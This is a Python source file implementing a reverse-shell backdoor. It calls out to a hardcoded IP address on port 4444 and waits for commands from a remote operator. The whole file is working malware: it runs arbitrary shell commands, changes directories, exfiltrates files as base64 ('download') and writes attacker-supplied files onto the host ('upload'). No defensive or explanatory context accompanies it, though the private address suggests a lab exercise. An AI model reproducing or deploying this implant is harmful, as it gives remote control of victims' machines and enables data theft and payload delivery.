import socket, subprocess
import pickle
import struct
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        # making a socket object
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port)) #connecting to the host computer

    def send_data(self, data):
        serialized_data = pickle.dumps(data)
        self.connection.sendall(struct.pack('>I', len(serialized_data)))
        self.connection.sendall(serialized_data)
    
    def receive_data(self):
        data_size = struct.unpack('>I', self.connection.recv(4))[0]
        received_payload = b""
        reamining_payload_size = data_size
        while reamining_payload_size != 0:
            received_payload += self.connection.recv(reamining_payload_size)
            reamining_payload_size = data_size - len(received_payload)
        data = pickle.loads(received_payload)
        return data

    def exceute_sys_command(self, command):
        try:
            p = subprocess.check_output(command, shell=True)
            return p
        except Exception as e:
            return f"[-] Error at the command! \n Error: {e}"

    def change_directories(self,path):
        os.chdir(path)
        return f"[+] Changed the directory to {path}"

    def read_files(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
    
    def write_file(self,path, content):
        with open(path, 'wb') as file:
            final_content = (base64.b64decode(content))
            file.write(final_content)
            return "[+] Upload succesfull!"

    def start(self):
        while True:
            recv_msg = self.receive_data() #receving command
            try:
                if recv_msg[0] == "exit":
                    self.connection.close()
                    exit()
                elif recv_msg[0] == "cd" and len(recv_msg) > 1:
                    cd_dir = " ".join(recv_msg[1:])
                    command_res = self.change_directories(cd_dir)
                elif recv_msg[0] == "download":
                    command_res = self.read_files(recv_msg[1])
                elif recv_msg[0] == "upload":
                    command_res = self.write_file(recv_msg[1], recv_msg[2])
                else:
                    command_res= (self.exceute_sys_command(recv_msg))
            
            except Exception as e:
                command_res = f"[-] Error during command excecution! \n Error: {e}"
            self.send_data((command_res))
        

start_backdoor= Backdoor("192.168.23.128", 4444)
start_backdoor.start()


